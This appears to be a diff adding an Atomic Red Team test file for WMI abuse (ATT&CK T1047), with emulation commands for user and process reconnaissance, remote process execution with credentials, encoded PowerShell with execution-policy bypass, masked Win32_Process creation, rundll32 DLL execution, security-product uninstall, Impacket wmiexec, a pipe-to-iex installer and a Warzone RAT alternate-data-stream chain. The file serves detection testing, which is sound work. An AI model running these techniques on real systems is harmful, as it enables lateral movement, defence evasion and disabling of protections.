@@ -1,0 +1,366 @@
+attack_technique: T1047
+display_name: Windows Management Instrumentation
+atomic_tests:
+- name: WMI Reconnaissance Users
+  auto_generated_guid: c107778c-dcf5-47c5-af2e-1d058a3df3ea
+  description: |
+    An adversary might use WMI to list all local User Accounts. 
+    When the test completes , there should be local user accounts information displayed on the command line.
+  supported_platforms:
+  - windows
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      wmic.exe must be present on the system. It is disabled by default on Windows 11, version 24H2 and later, and removed when upgrading to version 25H2.
+    prereq_command: |
+      if (Test-Path "$env:SystemRoot\System32\wbem\wmic.exe") {exit 0} else {exit 1}
+    get_prereq_command: |
+      DISM /Online /Add-Capability /CapabilityName:WMIC~~~~
+  executor:
+    command: |
+      wmic useraccount get /ALL /format:csv
+    name: command_prompt
+- name: WMI Reconnaissance Processes
+  auto_generated_guid: 5750aa16-0e59-4410-8b9a-8a47ca2788e2
+  description: |
+    An adversary might use WMI to list Processes running on the compromised host.
+    When the test completes , there should be running processes listed on the command line.
+  supported_platforms:
+  - windows
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      wmic.exe must be present on the system. It is disabled by default on Windows 11, version 24H2 and later, and removed when upgrading to version 25H2.
+    prereq_command: |
+      if (Test-Path "$env:SystemRoot\System32\wbem\wmic.exe") {exit 0} else {exit 1}
+    get_prereq_command: |
+      DISM /Online /Add-Capability /CapabilityName:WMIC~~~~
+  executor:
+    command: |
+      wmic process get caption,executablepath,commandline /format:csv
+    name: command_prompt
+- name: WMI Reconnaissance Software
+  auto_generated_guid: 718aebaa-d0e0-471a-8241-c5afa69c7414
+  description: |
+    An adversary might use WMI to list installed Software hotfix and patches.
+    When the test completes, there should be a list of installed patches and when they were installed.
+  supported_platforms:
+  - windows
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      wmic.exe must be present on the system. It is disabled by default on Windows 11, version 24H2 and later, and removed when upgrading to version 25H2.
+    prereq_command: |
+      if (Test-Path "$env:SystemRoot\System32\wbem\wmic.exe") {exit 0} else {exit 1}
+    get_prereq_command: |
+      DISM /Online /Add-Capability /CapabilityName:WMIC~~~~
+  executor:
+    command: |
+      wmic qfe get description,installedOn /format:csv
+    name: command_prompt
+- name: WMI Reconnaissance List Remote Services
+  auto_generated_guid: 0fd48ef7-d890-4e93-a533-f7dedd5191d3
+  description: |
+    An adversary might use WMI to check if a certain Remote Service is running on a remote device. 
+    When the test completes, a service information will be displayed on the screen if it exists.
+    A common feedback message is that "No instance(s) Available" if the service queried is not running.
+    A common error message is "Node - (provided IP or default)  ERROR Description =The RPC server is unavailable" 
+    if the provided remote host is unreachable
+  supported_platforms:
+  - windows
+  input_arguments:
+    node:
+      description: Ip Address
+      type: string
+      default: 127.0.0.1
+    service_search_string:
+      description: Name Of Service
+      type: string
+      default: Spooler
+  executor:
+    command: |
+      wmic /node:"#{node}" service where (caption like "%#{service_search_string}%")
+    name: command_prompt
+- name: WMI Execute Local Process
+  auto_generated_guid: b3bdfc91-b33e-4c6d-a5c8-d64bee0276b3
+  description: |
+    This test uses wmic.exe to execute a process on the local host.
+    When the test completes , a new process will be started locally .A notepad application will be started when input is left on default.
+  supported_platforms:
+  - windows
+  input_arguments:
+    process_to_execute:
+      description: Name or path of process to execute.
+      type: string
+      default: notepad.exe
+  executor:
+    command: |
+      wmic process call create #{process_to_execute}
+    cleanup_command: |
+      wmic process where name='#{process_to_execute}' delete >nul 2>&1
+    name: command_prompt
+- name: WMI Execute Remote Process
+  auto_generated_guid: 9c8ef159-c666-472f-9874-90c8d60d136b
+  description: |
+    This test uses wmic.exe to execute a process on a remote host. Specify a valid value for remote IP using the node parameter.
+    To clean up, provide the same node input as the one provided to run the test
+    A common error message is "Node - (provided IP or default)  ERROR Description =The RPC server is unavailable" if the default or provided IP is unreachable
+  supported_platforms:
+  - windows
+  input_arguments:
+    node:
+      description: Ip Address
+      type: string
+      default: 127.0.0.1
+    user_name:
+      description: Username
+      type: string
+      default: DOMAIN\Administrator
+    password:
+      description: Password
+      type: string
+      default: P@ssw0rd1
+    process_to_execute:
+      description: Name or path of process to execute.
+      type: string
+      default: notepad.exe
+  executor:
+    command: |
+      wmic /user:#{user_name} /password:#{password} /node:"#{node}" process call create #{process_to_execute}
+    cleanup_command: |
+      wmic /user:#{user_name} /password:#{password} /node:"#{node}" process where name='#{process_to_execute}' delete >nul 2>&1
+    name: command_prompt
+- name: Create a Process using WMI Query and an Encoded Command
+  auto_generated_guid: 7db7a7f9-9531-4840-9b30-46220135441c
+  description: |
+    Solarigate persistence is achieved via backdoors deployed via various techniques including using PowerShell with an EncodedCommand
+     Powershell -nop -exec bypass -EncodedCommand <encoded command>
+    Where the –EncodedCommand, once decoded, would resemble:
+      Invoke-WMIMethod win32_process -name create -argumentlist ‘rundll32 c:\windows\idmu\common\ypprop.dll _XInitImageFuncPtrs’ -ComputerName WORKSTATION
+    The EncodedCommand in this atomic is the following: Invoke-WmiMethod -Path win32_process -Name create -ArgumentList notepad.exe
+    You should expect to see notepad.exe running after execution of this test.
+    [Solarigate Analysis from Microsoft](https://www.microsoft.com/security/blog/2020/12/18/analyzing-solorigate-the-compromised-dll-file-that-started-a-sophisticated-cyberattack-and-how-microsoft-defender-helps-protect/)
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      powershell -exec bypass -e SQBuAHYAbwBrAGUALQBXAG0AaQBNAGUAdABoAG8AZAAgAC0AUABhAHQAaAAgAHcAaQBuADMAMgBfAHAAcgBvAGMAZQBzAHMAIAAtAE4AYQBtAGUAIABjAHIAZQBhAHQAZQAgAC0AQQByAGcAdQBtAGUAbgB0AEwAaQBzAHQAIABuAG8AdABlAHAAYQBkAC4AZQB4AGUA
+    name: command_prompt
+- name: Create a Process using obfuscated Win32_Process
+  auto_generated_guid: 10447c83-fc38-462a-a936-5102363b1c43
+  description: |
+    This test tries to mask process creation by creating a new class that inherits from Win32_Process. Indirect call of suspicious method such as Win32_Process::Create can break detection logic.
+    [Cybereason blog post No Win32_ProcessNeeded](https://www.cybereason.com/blog/wmi-lateral-movement-win32)
+  supported_platforms:
+  - windows
+  input_arguments:
+    new_class:
+      description: Derived class name
+      type: string
+      default: Win32_Atomic
+    process_to_execute:
+      description: Name or path of process to execute.
+      type: string
+      default: notepad.exe
+  executor:
+    name: powershell
+    elevation_required: true
+    command: |
+      $Class = New-Object Management.ManagementClass(New-Object Management.ManagementPath("Win32_Process"))
+      $NewClass = $Class.Derive("#{new_class}")
+      $NewClass.Put()
+      Invoke-WmiMethod -Path #{new_class} -Name create -ArgumentList #{process_to_execute}
+    cleanup_command: |
+      $CleanupClass = New-Object Management.ManagementClass(New-Object Management.ManagementPath("#{new_class}"))
+      try { $CleanupClass.Delete() } catch {}
+- name: WMI Execute rundll32
+  auto_generated_guid: 00738d2a-4651-4d76-adf2-c43a41dfb243
+  description: |
+    This test uses wmic.exe to execute a DLL function using rundll32. Specify a valid value for remote IP using the node parameter.
+  supported_platforms:
+  - windows
+  input_arguments:
+    node:
+      description: Ip Address
+      type: string
+      default: 127.0.0.1
+    dll_to_execute:
+      description: Path to DLL.
+      type: string
+      default: PathToAtomicsFolder\..\ExternalPayloads\calc.dll
+    function_to_execute:
+      description: Name of DLL function to call
+      type: string
+      default: StartW
+  dependency_executor_name: powershell
+  dependencies:
+  - description: DLL with function to execute must exist on disk at specified location (#{dll_to_execute})
+    prereq_command: |
+      if (Test-Path "#{dll_to_execute}") {exit 0} else {exit 1}
+    get_prereq_command: |
+      New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
+      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1047/bin/calc.dll?raw=true" -OutFile "#{dll_to_execute}"
+  executor:
+    command: |
+      wmic /node:#{node} process call create "rundll32.exe \"#{dll_to_execute}\" #{function_to_execute}"
+    cleanup_command: |-
+      taskkill /f /im calculator.exe
+    name: command_prompt
+- name: Application uninstall using WMIC
+  auto_generated_guid: c510d25b-1667-467d-8331-a56d3e9bc4ff
+  description: Emulates uninstalling  applications using WMIC.  This method only works if the product was installed with an msi file.  APTs have been seen using this to uninstall security products.
+  supported_platforms:
+  - windows
+  input_arguments:
+    node:
+      description: Computer the action is being executed against but defaults to the localhost.
+      type: string
+      default: 127.0.0.1
+    product:
+      description: Enter the product name being uninstalled.  This will default to TightVNC.
+      type: string
+      default: Tightvnc
+  dependency_executor_name: powershell
+  dependencies:
+  - description: TightVNC must be installed.
+    prereq_command: if ((Test-Path "C:\Program Files\TightVNC\tvnviewer.exe")-Or (Test-Path "C:\Program Files (x86)\TightVNC\tvnviewer.exe")) {exit 0} else {exit 1}
+    get_prereq_command: |-
+      Invoke-WebRequest 'https://www.tightvnc.com/download/2.8.63/tightvnc-2.8.63-gpl-setup-64bit.msi' -OutFile "PathToAtomicsFolder\..\ExternalPayloads\tightvncinstaller.msi"
+      start-sleep -s 10
+      msiexec /i "PathToAtomicsFolder\..\ExternalPayloads\tightvncinstaller.msi" /qn /norestart
+      start-sleep -s 15
+  executor:
+    command: wmic /node:"#{node}" product where "name like '#{product}%%'" call uninstall
+    cleanup_command: msiexec /i "PathToAtomicsFolder\..\ExternalPayloads\tightvncinstaller.msi" /qn /norestart
+    name: command_prompt
+    elevation_required: true
+- name: Impacket wmiexec.py
+  auto_generated_guid: a3ddaf15-d1a1-4bc3-8683-84c7c67120fe
+  description: |
+    wmiexec.py is tool included in the Impacket toolkit that allows to execute commands remotely on a Windows System using WMI (Windows management Instrumentation).
+  supported_platforms:
+  - windows
+  input_arguments:
+    target_domain:
+      description: Domain of the Target machine.
+      type: string
+      default: "$env:USERDNSDOMAIN"
+    user_name:
+      description: username on the target machine.
+      type: string
+      default: "$env:USERNAME"
+    password:
+      description: password for the target machine
+      type: string
+      default: "1234"
+    target_host:
+      description: IP address or hostname of the target machine.
+      type: string
+      default: "$env:COMPUTERNAME"
+    command:
+      description: Command to execute on the target machine.
+      type: string
+      default: "ipconfig"
+    optional_args:
+      description: Additional arguments to use (like -k -no-pass)
+      type: string
+      default:
+    uv_install_dir:
+      description: Directory where the uv binary is installed
+      type: path
+      default: $env:TEMP\uv
+    uv_tool_dir:
+      description: Directory where uv installs tool virtualenvs
+      type: path
+      default: $env:TEMP\uv\tools
+    uv_tool_bin_dir:
+      description: Directory where uv places tool executable shims
+      type: path
+      default: $env:TEMP\uv\tools\bin
+  dependencies:
+  - description: |
+      uv must be installed
+    prereq_command: |
+      if (Test-Path "#{uv_install_dir}\uv.exe") { exit 0 } else { exit 1 }
+    get_prereq_command: |
+      $env:UV_INSTALL_DIR = "#{uv_install_dir}"
+      irm https://astral.sh/uv/install.ps1 | iex
+      New-Item -ItemType File -Path "$env:TEMP\uv_installed_by_atomic" -Force | Out-Null
+  - description: |
+      Impacket must be installed via uv
+    prereq_command: |
+      if (Test-Path "#{uv_tool_bin_dir}\wmiexec.py") { exit 0 } else { exit 1 }
+    get_prereq_command: |
+      $env:PATH = "#{uv_install_dir};#{uv_tool_bin_dir};$env:PATH"
+      $env:UV_TOOL_DIR = "#{uv_tool_dir}"
+      $env:UV_TOOL_BIN_DIR = "#{uv_tool_bin_dir}"
+      uv tool install impacket
+  executor:
+    command: |
+      cd #{uv_tool_bin_dir}
+      $optionalArgs = "#{optional_args}"
+      $argList = @("#{command}")
+      if (-not [string]::IsNullOrWhiteSpace($optionalArgs)) { $argList += $optionalArgs.Split(" ") }
+      .\wmiexec.py #{target_domain}/#{user_name}:#{password}@#{target_host} @argList
+    cleanup_command: |
+      $env:PATH = "#{uv_install_dir};#{uv_tool_bin_dir};$env:PATH"
+      $env:UV_TOOL_DIR = "#{uv_tool_dir}"
+      $env:UV_TOOL_BIN_DIR = "#{uv_tool_bin_dir}"
+      uv tool uninstall impacket 2>$null
+      Remove-Item "#{uv_tool_dir}" -Recurse -Force -ErrorAction SilentlyContinue
+      if (Test-Path "$env:TEMP\uv_installed_by_atomic") {
+        Remove-Item "$env:TEMP\uv_installed_by_atomic" -Force -ErrorAction SilentlyContinue
+        uv self uninstall 2>$null
+      }
+    name: powershell
+- name: AveMaria/Warzone program.bat WMIC Process Creation
+  auto_generated_guid: 778b54b0-ae7a-4f80-b74b-59eddee87ad5
+  description: |
+    Emulates the evasive behavior of the Ave Maria/Warzone RAT, which follows these steps:
+    1. Creates a batch script (program_path) that runs commands found in its own ADS named start (program_path:start)
+    2. Writes to program_path:start a wmiexec command that starts a process from an ADS named ApplicationData of a specified file (ads_host:ApplicationData)
+    3. Writes to the ADS ads_host:ApplicationData the contents of an executable (normally would be the ransomware)
+    4. Runs the batch script, which runs everything that was set up
+
+    Reference: https://www.splunk.com/en_us/blog/security/defending-the-gates-understanding-and-detecting-ave-maria-warzone-rat.html
+  supported_platforms:
+  - windows
+  input_arguments:
+    payload_binary:
+      description: Benign executable to persist (stand-in for the malware payload)
+      type: path
+      default: C:\Windows\System32\calc.exe
+    program_path:
+      description: Full filepath (including filename) that the batch script is created to
+      type: path
+      default: $env:TEMP\program.bat
+    ads_host:
+      description: File the Alternate Data Stream ApplicationData is attached to
+      type: path
+      default: $env:TEMP\ads
+  dependencies:
+    - description: |
+        ads_host must exist
+      prereq_command: |
+        if (Test-Path -Path "#{ads_host}") { exit 0 } else { exit 1 }
+      get_prereq_command: |
+        $parent = Split-Path "#{ads_host}"
+        New-Item -ItemType Directory -Path "$parent" -Force
+        New-Item -ItemType File -Path "#{ads_host}" -Force
+        New-Item -ItemType File -Path "$env:TEMP\ads_created" -Force
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      $parent = Split-Path "#{program_path}"
+      New-Item -ItemType Directory -Path "$parent" -Force
+      New-Item -ItemType File -Path "#{program_path}" -Force
+      Set-Content -Path "#{program_path}" -Value "for /F `"usebackq tokens=*`" %%A in (`"#{program_path}:start`") do %%A"
+      Set-Content -Path "#{program_path}" -Stream start -Value "wmic process call create `"#{ads_host}:ApplicationData`""
+      Get-Content "#{payload_binary}" -Encoding Byte -Raw | Set-Content -Path "#{ads_host}" -Stream ApplicationData -Encoding Byte
+      Start-Process "#{program_path}"
+    cleanup_command: |
+      Get-Process | Where-Object { $_.Path -eq "#{payload_binary}" } | Stop-Process -Force -ErrorAction SilentlyContinue
+      Remove-Item "#{program_path}" -Force -ErrorAction Ignore
+      if (Test-Path -Path "$env:TEMP\ads_created"){Remove-Item -Path "#{ads_host}" -ErrorAction Ignore} else {Remove-Item -Path "#{ads_host}" -Stream "ApplicationData" -ErrorAction Ignore}
+      Remove-Item -Path "$env:TEMP\ads_created" -Force -ErrorAction Ignore
